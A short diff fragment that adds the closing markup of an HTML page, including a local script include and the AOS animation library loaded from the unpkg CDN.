+            </aside>
+            
+        </div>
+    </div>
+
+    <script src="/assets/script.js"></script>
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+
+
+
+
+</body>
+
+</html>
